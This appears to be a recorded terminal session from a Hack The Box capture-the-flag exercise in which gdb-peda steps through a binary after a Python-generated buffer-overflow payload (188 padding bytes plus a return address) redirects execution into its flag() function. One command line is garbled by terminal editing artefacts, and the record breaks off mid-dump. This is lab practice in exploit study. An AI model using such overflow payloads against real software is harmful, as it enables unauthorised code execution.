@@ -1,0 +1,827 @@
+Script started on 2021-01-11 20:22:27-0800
+ubuntu@ubuntu:~/CTF/hackthebox$ gdb ./vuln 
+GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./vuln...(no debugging symbols found)...done.
+gdb-peda$ quitcinfo framenr < <(python -c "print('A' * 188) + '\xe2\x91\x04\x08' ")break *0x080492abdisass vulninfo func flagbreak
+Breakpoint 1 at 0x80491e6
+gdb-peda$ break flagquitcinfo framenr < <(python -c "print('A' * 188) + '\xe2\x91\x04\x08' ")
+Starting program: /home/ubuntu/CTF/hackthebox/vuln < <(python -c "print('A' * 188) + '\xe2\x91\x04\x08' ")
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAâ‘
+[----------------------------------registers-----------------------------------]
+EAX: 0xc1 
+EBX: 0x41414141 ('AAAA')
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd158 ("AAAAAAAA")
+EIP: 0x80491e6 (<flag+4>:	sub    esp,0x54)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491e2 <flag>:	push   ebp
+   0x80491e3 <flag+1>:	mov    ebp,esp
+   0x80491e5 <flag+3>:	push   ebx
+=> 0x80491e6 <flag+4>:	sub    esp,0x54
+   0x80491e9 <flag+7>:	call   0x8049120 <__x86.get_pc_thunk.bx>
+   0x80491ee <flag+12>:	add    ebx,0x2e12
+   0x80491f4 <flag+18>:	sub    esp,0x8
+   0x80491f7 <flag+21>:	lea    eax,[ebx-0x1ff8]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd158 ("AAAAAAAA")
+0004| 0xffffd15c ("AAAA")
+0008| 0xffffd160 --> 0x0 
+0012| 0xffffd164 --> 0xffffd224 --> 0xffffd3d7 ("/home/ubuntu/CTF/hackthebox/vuln")
+0016| 0xffffd168 --> 0xffffd22c --> 0xffffd3f8 ("CLUTTER_IM_MODULE=xim")
+0020| 0xffffd16c --> 0x3e8 
+0024| 0xffffd170 --> 0xffffd190 --> 0x1 
+0028| 0xffffd174 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080491e6 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xc1 
+EBX: 0x41414141 ('AAAA')
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd104 ('A' <repeats 92 times>)
+EIP: 0x80491e9 (<flag+7>:	call   0x8049120 <__x86.get_pc_thunk.bx>)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491e3 <flag+1>:	mov    ebp,esp
+   0x80491e5 <flag+3>:	push   ebx
+   0x80491e6 <flag+4>:	sub    esp,0x54
+=> 0x80491e9 <flag+7>:	call   0x8049120 <__x86.get_pc_thunk.bx>
+   0x80491ee <flag+12>:	add    ebx,0x2e12
+   0x80491f4 <flag+18>:	sub    esp,0x8
+   0x80491f7 <flag+21>:	lea    eax,[ebx-0x1ff8]
+   0x80491fd <flag+27>:	push   eax
+Guessed arguments:
+arg[0]: 0x41414141 ('AAAA')
+arg[1]: 0x41414141 ('AAAA')
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd104 ('A' <repeats 92 times>)
+0004| 0xffffd108 ('A' <repeats 88 times>)
+0008| 0xffffd10c ('A' <repeats 84 times>)
+0012| 0xffffd110 ('A' <repeats 80 times>)
+0016| 0xffffd114 ('A' <repeats 76 times>)
+0020| 0xffffd118 ('A' <repeats 72 times>)
+0024| 0xffffd11c ('A' <repeats 68 times>)
+0028| 0xffffd120 ('A' <repeats 64 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080491e9 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xc1 
+EBX: 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd104 ('A' <repeats 92 times>)
+EIP: 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491e5 <flag+3>:	push   ebx
+   0x80491e6 <flag+4>:	sub    esp,0x54
+   0x80491e9 <flag+7>:	call   0x8049120 <__x86.get_pc_thunk.bx>
+=> 0x80491ee <flag+12>:	add    ebx,0x2e12
+   0x80491f4 <flag+18>:	sub    esp,0x8
+   0x80491f7 <flag+21>:	lea    eax,[ebx-0x1ff8]
+   0x80491fd <flag+27>:	push   eax
+   0x80491fe <flag+28>:	lea    eax,[ebx-0x1ff6]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd104 ('A' <repeats 92 times>)
+0004| 0xffffd108 ('A' <repeats 88 times>)
+0008| 0xffffd10c ('A' <repeats 84 times>)
+0012| 0xffffd110 ('A' <repeats 80 times>)
+0016| 0xffffd114 ('A' <repeats 76 times>)
+0020| 0xffffd118 ('A' <repeats 72 times>)
+0024| 0xffffd11c ('A' <repeats 68 times>)
+0028| 0xffffd120 ('A' <repeats 64 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080491ee in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xc1 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd104 ('A' <repeats 92 times>)
+EIP: 0x80491f4 (<flag+18>:	sub    esp,0x8)
+EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491e6 <flag+4>:	sub    esp,0x54
+   0x80491e9 <flag+7>:	call   0x8049120 <__x86.get_pc_thunk.bx>
+   0x80491ee <flag+12>:	add    ebx,0x2e12
+=> 0x80491f4 <flag+18>:	sub    esp,0x8
+   0x80491f7 <flag+21>:	lea    eax,[ebx-0x1ff8]
+   0x80491fd <flag+27>:	push   eax
+   0x80491fe <flag+28>:	lea    eax,[ebx-0x1ff6]
+   0x8049204 <flag+34>:	push   eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd104 ('A' <repeats 92 times>)
+0004| 0xffffd108 ('A' <repeats 88 times>)
+0008| 0xffffd10c ('A' <repeats 84 times>)
+0012| 0xffffd110 ('A' <repeats 80 times>)
+0016| 0xffffd114 ('A' <repeats 76 times>)
+0020| 0xffffd118 ('A' <repeats 72 times>)
+0024| 0xffffd11c ('A' <repeats 68 times>)
+0028| 0xffffd120 ('A' <repeats 64 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080491f4 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xc1 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0fc ("AAAA\356\221\004\b", 'A' <repeats 92 times>)
+EIP: 0x80491f7 (<flag+21>:	lea    eax,[ebx-0x1ff8])
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491e9 <flag+7>:	call   0x8049120 <__x86.get_pc_thunk.bx>
+   0x80491ee <flag+12>:	add    ebx,0x2e12
+   0x80491f4 <flag+18>:	sub    esp,0x8
+=> 0x80491f7 <flag+21>:	lea    eax,[ebx-0x1ff8]
+   0x80491fd <flag+27>:	push   eax
+   0x80491fe <flag+28>:	lea    eax,[ebx-0x1ff6]
+   0x8049204 <flag+34>:	push   eax
+   0x8049205 <flag+35>:	call   0x80490b0 <fopen@plt>
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0fc ("AAAA\356\221\004\b", 'A' <repeats 92 times>)
+0004| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0008| 0xffffd104 ('A' <repeats 92 times>)
+0012| 0xffffd108 ('A' <repeats 88 times>)
+0016| 0xffffd10c ('A' <repeats 84 times>)
+0020| 0xffffd110 ('A' <repeats 80 times>)
+0024| 0xffffd114 ('A' <repeats 76 times>)
+0028| 0xffffd118 ('A' <repeats 72 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080491f7 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804a008 --> 0x6c660072 ('r')
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0fc ("AAAA\356\221\004\b", 'A' <repeats 92 times>)
+EIP: 0x80491fd (<flag+27>:	push   eax)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491ee <flag+12>:	add    ebx,0x2e12
+   0x80491f4 <flag+18>:	sub    esp,0x8
+   0x80491f7 <flag+21>:	lea    eax,[ebx-0x1ff8]
+=> 0x80491fd <flag+27>:	push   eax
+   0x80491fe <flag+28>:	lea    eax,[ebx-0x1ff6]
+   0x8049204 <flag+34>:	push   eax
+   0x8049205 <flag+35>:	call   0x80490b0 <fopen@plt>
+   0x804920a <flag+40>:	add    esp,0x10
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0fc ("AAAA\356\221\004\b", 'A' <repeats 92 times>)
+0004| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0008| 0xffffd104 ('A' <repeats 92 times>)
+0012| 0xffffd108 ('A' <repeats 88 times>)
+0016| 0xffffd10c ('A' <repeats 84 times>)
+0020| 0xffffd110 ('A' <repeats 80 times>)
+0024| 0xffffd114 ('A' <repeats 76 times>)
+0028| 0xffffd118 ('A' <repeats 72 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080491fd in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804a008 --> 0x6c660072 ('r')
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0f8 --> 0x804a008 --> 0x6c660072 ('r')
+EIP: 0x80491fe (<flag+28>:	lea    eax,[ebx-0x1ff6])
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491f4 <flag+18>:	sub    esp,0x8
+   0x80491f7 <flag+21>:	lea    eax,[ebx-0x1ff8]
+   0x80491fd <flag+27>:	push   eax
+=> 0x80491fe <flag+28>:	lea    eax,[ebx-0x1ff6]
+   0x8049204 <flag+34>:	push   eax
+   0x8049205 <flag+35>:	call   0x80490b0 <fopen@plt>
+   0x804920a <flag+40>:	add    esp,0x10
+   0x804920d <flag+43>:	mov    DWORD PTR [ebp-0xc],eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0f8 --> 0x804a008 --> 0x6c660072 ('r')
+0004| 0xffffd0fc ("AAAA\356\221\004\b", 'A' <repeats 92 times>)
+0008| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0012| 0xffffd104 ('A' <repeats 92 times>)
+0016| 0xffffd108 ('A' <repeats 88 times>)
+0020| 0xffffd10c ('A' <repeats 84 times>)
+0024| 0xffffd110 ('A' <repeats 80 times>)
+0028| 0xffffd114 ('A' <repeats 76 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080491fe in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804a00a ("flag.txt")
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0f8 --> 0x804a008 --> 0x6c660072 ('r')
+EIP: 0x8049204 (<flag+34>:	push   eax)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491f7 <flag+21>:	lea    eax,[ebx-0x1ff8]
+   0x80491fd <flag+27>:	push   eax
+   0x80491fe <flag+28>:	lea    eax,[ebx-0x1ff6]
+=> 0x8049204 <flag+34>:	push   eax
+   0x8049205 <flag+35>:	call   0x80490b0 <fopen@plt>
+   0x804920a <flag+40>:	add    esp,0x10
+   0x804920d <flag+43>:	mov    DWORD PTR [ebp-0xc],eax
+   0x8049210 <flag+46>:	cmp    DWORD PTR [ebp-0xc],0x0
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0f8 --> 0x804a008 --> 0x6c660072 ('r')
+0004| 0xffffd0fc ("AAAA\356\221\004\b", 'A' <repeats 92 times>)
+0008| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0012| 0xffffd104 ('A' <repeats 92 times>)
+0016| 0xffffd108 ('A' <repeats 88 times>)
+0020| 0xffffd10c ('A' <repeats 84 times>)
+0024| 0xffffd110 ('A' <repeats 80 times>)
+0028| 0xffffd114 ('A' <repeats 76 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08049204 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804a00a ("flag.txt")
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0xf7fb4dc7 --> 0xfb58900a 
+EDX: 0xf7fb5890 --> 0x0 
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0f4 --> 0x804a00a ("flag.txt")
+EIP: 0x8049205 (<flag+35>:	call   0x80490b0 <fopen@plt>)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491fd <flag+27>:	push   eax
+   0x80491fe <flag+28>:	lea    eax,[ebx-0x1ff6]
+   0x8049204 <flag+34>:	push   eax
+=> 0x8049205 <flag+35>:	call   0x80490b0 <fopen@plt>
+   0x804920a <flag+40>:	add    esp,0x10
+   0x804920d <flag+43>:	mov    DWORD PTR [ebp-0xc],eax
+   0x8049210 <flag+46>:	cmp    DWORD PTR [ebp-0xc],0x0
+   0x8049214 <flag+50>:	jne    0x8049232 <flag+80>
+Guessed arguments:
+arg[0]: 0x804a00a ("flag.txt")
+arg[1]: 0x804a008 --> 0x6c660072 ('r')
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0f4 --> 0x804a00a ("flag.txt")
+0004| 0xffffd0f8 --> 0x804a008 --> 0x6c660072 ('r')
+0008| 0xffffd0fc ("AAAA\356\221\004\b", 'A' <repeats 92 times>)
+0012| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0016| 0xffffd104 ('A' <repeats 92 times>)
+0020| 0xffffd108 ('A' <repeats 88 times>)
+0024| 0xffffd10c ('A' <repeats 84 times>)
+0028| 0xffffd110 ('A' <repeats 80 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08049205 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804e170 --> 0xfbad2488 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x2c00 ('')
+EDX: 0x2c2c2c2c (',,,,')
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0f4 --> 0x804a00a ("flag.txt")
+EIP: 0x804920a (<flag+40>:	add    esp,0x10)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491fe <flag+28>:	lea    eax,[ebx-0x1ff6]
+   0x8049204 <flag+34>:	push   eax
+   0x8049205 <flag+35>:	call   0x80490b0 <fopen@plt>
+=> 0x804920a <flag+40>:	add    esp,0x10
+   0x804920d <flag+43>:	mov    DWORD PTR [ebp-0xc],eax
+   0x8049210 <flag+46>:	cmp    DWORD PTR [ebp-0xc],0x0
+   0x8049214 <flag+50>:	jne    0x8049232 <flag+80>
+   0x8049216 <flag+52>:	sub    esp,0xc
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0f4 --> 0x804a00a ("flag.txt")
+0004| 0xffffd0f8 --> 0x804a008 --> 0x6c660072 ('r')
+0008| 0xffffd0fc ("AAAA\356\221\004\b", 'A' <repeats 92 times>)
+0012| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0016| 0xffffd104 ('A' <repeats 92 times>)
+0020| 0xffffd108 ('A' <repeats 88 times>)
+0024| 0xffffd10c ('A' <repeats 84 times>)
+0028| 0xffffd110 ('A' <repeats 80 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804920a in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804e170 --> 0xfbad2488 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x2c00 ('')
+EDX: 0x2c2c2c2c (',,,,')
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd104 ('A' <repeats 92 times>)
+EIP: 0x804920d (<flag+43>:	mov    DWORD PTR [ebp-0xc],eax)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049204 <flag+34>:	push   eax
+   0x8049205 <flag+35>:	call   0x80490b0 <fopen@plt>
+   0x804920a <flag+40>:	add    esp,0x10
+=> 0x804920d <flag+43>:	mov    DWORD PTR [ebp-0xc],eax
+   0x8049210 <flag+46>:	cmp    DWORD PTR [ebp-0xc],0x0
+   0x8049214 <flag+50>:	jne    0x8049232 <flag+80>
+   0x8049216 <flag+52>:	sub    esp,0xc
+   0x8049219 <flag+55>:	lea    eax,[ebx-0x1fec]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd104 ('A' <repeats 92 times>)
+0004| 0xffffd108 ('A' <repeats 88 times>)
+0008| 0xffffd10c ('A' <repeats 84 times>)
+0012| 0xffffd110 ('A' <repeats 80 times>)
+0016| 0xffffd114 ('A' <repeats 76 times>)
+0020| 0xffffd118 ('A' <repeats 72 times>)
+0024| 0xffffd11c ('A' <repeats 68 times>)
+0028| 0xffffd120 ('A' <repeats 64 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0804920d in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804e170 --> 0xfbad2488 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x2c00 ('')
+EDX: 0x2c2c2c2c (',,,,')
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+EIP: 0x8049210 (<flag+46>:	cmp    DWORD PTR [ebp-0xc],0x0)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049205 <flag+35>:	call   0x80490b0 <fopen@plt>
+   0x804920a <flag+40>:	add    esp,0x10
+   0x804920d <flag+43>:	mov    DWORD PTR [ebp-0xc],eax
+=> 0x8049210 <flag+46>:	cmp    DWORD PTR [ebp-0xc],0x0
+   0x8049214 <flag+50>:	jne    0x8049232 <flag+80>
+   0x8049216 <flag+52>:	sub    esp,0xc
+   0x8049219 <flag+55>:	lea    eax,[ebx-0x1fec]
+   0x804921f <flag+61>:	push   eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0004| 0xffffd108 ('A' <repeats 72 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0008| 0xffffd10c ('A' <repeats 68 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0012| 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0016| 0xffffd114 ('A' <repeats 60 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0020| 0xffffd118 ('A' <repeats 56 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0024| 0xffffd11c ('A' <repeats 52 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0028| 0xffffd120 ('A' <repeats 48 times>, "p\341\004\b", 'A' <repeats 12 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08049210 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804e170 --> 0xfbad2488 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x2c00 ('')
+EDX: 0x2c2c2c2c (',,,,')
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+EIP: 0x8049214 (<flag+50>:	jne    0x8049232 <flag+80>)
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804920a <flag+40>:	add    esp,0x10
+   0x804920d <flag+43>:	mov    DWORD PTR [ebp-0xc],eax
+   0x8049210 <flag+46>:	cmp    DWORD PTR [ebp-0xc],0x0
+=> 0x8049214 <flag+50>:	jne    0x8049232 <flag+80>
+ | 0x8049216 <flag+52>:	sub    esp,0xc
+ | 0x8049219 <flag+55>:	lea    eax,[ebx-0x1fec]
+ | 0x804921f <flag+61>:	push   eax
+ | 0x8049220 <flag+62>:	call   0x8049070 <puts@plt>
+ |->   0x8049232 <flag+80>:	sub    esp,0x4
+       0x8049235 <flag+83>:	push   DWORD PTR [ebp-0xc]
+       0x8049238 <flag+86>:	push   0x40
+       0x804923a <flag+88>:	lea    eax,[ebp-0x4c]
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0004| 0xffffd108 ('A' <repeats 72 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0008| 0xffffd10c ('A' <repeats 68 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0012| 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0016| 0xffffd114 ('A' <repeats 60 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0020| 0xffffd118 ('A' <repeats 56 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0024| 0xffffd11c ('A' <repeats 52 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0028| 0xffffd120 ('A' <repeats 48 times>, "p\341\004\b", 'A' <repeats 12 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08049214 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804e170 --> 0xfbad2488 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x2c00 ('')
+EDX: 0x2c2c2c2c (',,,,')
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+EIP: 0x8049232 (<flag+80>:	sub    esp,0x4)
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049228 <flag+70>:	sub    esp,0xc
+   0x804922b <flag+73>:	push   0x0
+   0x804922d <flag+75>:	call   0x8049080 <exit@plt>
+=> 0x8049232 <flag+80>:	sub    esp,0x4
+   0x8049235 <flag+83>:	push   DWORD PTR [ebp-0xc]
+   0x8049238 <flag+86>:	push   0x40
+   0x804923a <flag+88>:	lea    eax,[ebp-0x4c]
+   0x804923d <flag+91>:	push   eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0004| 0xffffd108 ('A' <repeats 72 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0008| 0xffffd10c ('A' <repeats 68 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0012| 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0016| 0xffffd114 ('A' <repeats 60 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0020| 0xffffd118 ('A' <repeats 56 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0024| 0xffffd11c ('A' <repeats 52 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0028| 0xffffd120 ('A' <repeats 48 times>, "p\341\004\b", 'A' <repeats 12 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08049232 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804e170 --> 0xfbad2488 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x2c00 ('')
+EDX: 0x2c2c2c2c (',,,,')
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+EIP: 0x8049235 (<flag+83>:	push   DWORD PTR [ebp-0xc])
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804922b <flag+73>:	push   0x0
+   0x804922d <flag+75>:	call   0x8049080 <exit@plt>
+   0x8049232 <flag+80>:	sub    esp,0x4
+=> 0x8049235 <flag+83>:	push   DWORD PTR [ebp-0xc]
+   0x8049238 <flag+86>:	push   0x40
+   0x804923a <flag+88>:	lea    eax,[ebp-0x4c]
+   0x804923d <flag+91>:	push   eax
+   0x804923e <flag+92>:	call   0x8049050 <fgets@plt>
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd100 --> 0x80491ee (<flag+12>:	add    ebx,0x2e12)
+0004| 0xffffd104 ('A' <repeats 76 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0008| 0xffffd108 ('A' <repeats 72 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0012| 0xffffd10c ('A' <repeats 68 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0016| 0xffffd110 ('A' <repeats 64 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0020| 0xffffd114 ('A' <repeats 60 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0024| 0xffffd118 ('A' <repeats 56 times>, "p\341\004\b", 'A' <repeats 12 times>)
+0028| 0xffffd11c ('A' <repeats 52 times>, "p\341\004\b", 'A' <repeats 12 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x08049235 in flag ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804e170 --> 0xfbad2488 
+EBX: 0x804c000 --> 0x804bf10 --> 0x1 
+ECX: 0x2c00 ('')
+EDX: 0x2c2c2c2c (',,,,')
+ESI: 0xf7fb4000 --> 0x1d4d8c 
+EDI: 0x0 
+EBP: 0xffffd15c ("AAAA")
+ESP: 0xffffd0fc --> 0x804e170 --> 0xfbad2488 
